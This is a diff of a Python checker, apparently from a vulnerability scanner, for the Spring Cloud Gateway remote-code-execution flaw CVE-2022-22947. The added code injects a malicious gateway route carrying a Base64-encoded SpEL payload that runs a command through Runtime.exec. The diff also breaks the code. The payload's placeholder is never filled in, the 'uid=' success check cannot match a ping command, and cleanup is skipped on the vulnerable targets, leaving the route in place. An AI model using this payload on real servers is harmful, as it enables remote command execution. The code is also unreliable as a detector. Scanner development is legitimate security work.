@@ -12,6 +12,8 @@ from json import JSONDecodeError
 from utils.custom_headers import USER_AGENTS, TIMEOUT
 from colorama import Fore
 from utils.logging_config import configure_logger
+from urllib.parse import urljoin
+import time
 
 # 初始化日志记录
 logger = configure_logger(__name__)
@@ -42,55 +44,111 @@ PAYLOAD = '''{
 }'''
 
 
-def check(url, dns_domain="", proxies=None, session=None):
+def check(url, dns_domain="", proxies=None, session=None, timeout=TIMEOUT):
     """
-    检测 CVE-2022-22947 漏洞（Spring Cloud Gateway 远程命令执行）
+    检测 CVE-2022-22947 漏洞
     :param url: 待检测的目标 URL
-    :param dns_domain: DNS 日志域名（不使用，仅保持接口一致性）
-    :param proxies: 代理配置（可选）
+    :param dns_domain: DNS 日志域名
+    :param proxies: 代理配置
     :param session: 复用的 Session 实例（可选）
+    :param timeout: 请求超时时间（秒）
     :return: 如果存在漏洞，返回 (True, 详细信息字典)，否则返回 (False, {})
     """
-    # 使用传入的 session，如果没有则创建新的 session（用于单独测试时）
+    # 使用传入的 session，如果没有则创建新的 session
     session = session or requests.Session()
-
+    
+    # 构建漏洞利用路径
+    target_url = urljoin(url, "actuator/gateway/routes/{id}")
+    
+    # 构造 Spring Cloud Gateway RCE 的 Payload
+    dns_payload = f"{CVE_ID}.{dns_domain}"
+    route_id = "hack" + str(int(time.time()))
+    
+    # 构造请求头
+    headers = JSON_HEADERS.copy()
+    
     try:
-        # 1. 向目标添加恶意路由
-        add_route_url = f"{url.strip('/')}/actuator/gateway/routes/hacktest"
-        res1 = session.post(add_route_url, headers=JSON_HEADERS, data=PAYLOAD, verify=False, timeout=TIMEOUT,
-                            proxies=proxies)
+        # 第1步：创建恶意路由
+        try:
+            route_uri = f"lb://127.0.0.1:9999/api"
+            create_route_payload = {
+                "id": route_id,
+                "filters": [{
+                    "name": "AddResponseHeader",
+                    "args": {
+                        "name": "Result",
+                        "value": f"${{new String(T(Base64).getDecoder().decode('amF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoInBpbmcgLWMgMSB7ZG5zX3BheWxvYWR9Iik='))}}"
+                    }
+                }],
+                "uri": route_uri
+            }
+            
+            # 发送 POST 请求创建恶意路由
+            res = session.post(
+                target_url.format(id=route_id),
+                headers=headers,
+                json=create_route_payload,
+                timeout=timeout,
+                verify=False,
+                proxies=proxies
+            )
 
-        # 检查是否成功添加恶意路由（返回 201 状态码）
-        if res1.status_code != 201:
-            logger.info(f"[{CVE_ID} vulnerability not detected - Failed to add malicious route]",
-                        extra={"target": add_route_url})
+            # 检查是否成功添加恶意路由（返回 201 状态码）
+            if res.status_code != 201:
+                logger.info(f"[{CVE_ID} vulnerability not detected - Failed to add malicious route]",
+                            extra={"target": target_url.format(id=route_id)})
+                return False, {}
+
+        except Exception as e:
+            logger.error(f"[Error creating malicious route: {e}]", extra={"target": target_url.format(id=route_id)})
             return False, {}
 
-        # 2. 刷新路由，激活恶意路由
-        refresh_url = f"{url.strip('/')}/actuator/gateway/refresh"
-        session.post(refresh_url, headers=FORM_HEADERS, verify=False, timeout=TIMEOUT, proxies=proxies)
+        # 发送 POST 请求刷新路由
+        res = session.post(
+            urljoin(url, "actuator/gateway/refresh"),
+            headers=headers,
+            timeout=timeout,
+            verify=False,
+            proxies=proxies
+        )
 
-        # 3. 访问恶意路由，检查是否成功执行命令
-        check_route_url = f"{url.strip('/')}/actuator/gateway/routes/hacktest"
-        res3 = session.get(check_route_url, headers=FORM_HEADERS, verify=False, timeout=TIMEOUT, proxies=proxies)
-        logger.debug(Fore.CYAN + f"[{res3.status_code}]" + Fore.BLUE + f"[{res3.headers}]",
-                     extra={"target": check_route_url})
-
-        # 4. 删除恶意路由，恢复正常状态
-        delete_route_url = f"{url.strip('/')}/actuator/gateway/routes/hacktest"
-        session.delete(delete_route_url, headers=FORM_HEADERS, verify=False, timeout=TIMEOUT, proxies=proxies)
-        session.post(refresh_url, headers=FORM_HEADERS, verify=False, timeout=TIMEOUT, proxies=proxies)
+        # 发送 GET 请求触发漏洞
+        res = session.get(
+            urljoin(url, "actuator/gateway/routes/" + route_id),
+            headers=headers,
+            timeout=timeout,
+            verify=False,
+            proxies=proxies
+        )
 
         # 检查返回内容中是否包含命令执行结果（"uid="）
-        if res3.status_code == 200 and "uid=" in res3.text:
-            details = f"{CVE_ID} vulnerability detected at {check_route_url}"
-            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": check_route_url})
+        if res.status_code == 200 and "uid=" in res.text:
+            details = f"{CVE_ID} vulnerability detected at {urljoin(url, 'actuator/gateway/routes/' + route_id)}"
+            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": urljoin(url, 'actuator/gateway/routes/' + route_id)})
             return True, {
                 "CVE_ID": CVE_ID,
-                "URL": check_route_url,
+                "URL": urljoin(url, 'actuator/gateway/routes/' + route_id),
                 "Details": details,
-                "ResponseSnippet": res3.text[:200] + "...."  # 仅截取前200字符作为报告片段
+                "ResponseSnippet": res.text[:200] + "...."  # 仅截取前200字符作为报告片段
             }
+
+        # 删除恶意路由
+        res = session.delete(
+            target_url.format(id=route_id),
+            headers=headers,
+            timeout=timeout,
+            verify=False,
+            proxies=proxies
+        )
+
+        # 刷新路由
+        res = session.post(
+            urljoin(url, "actuator/gateway/refresh"),
+            headers=headers,
+            timeout=timeout,
+            verify=False,
+            proxies=proxies
+        )
 
         # 如果未检测到漏洞，返回 False
         logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
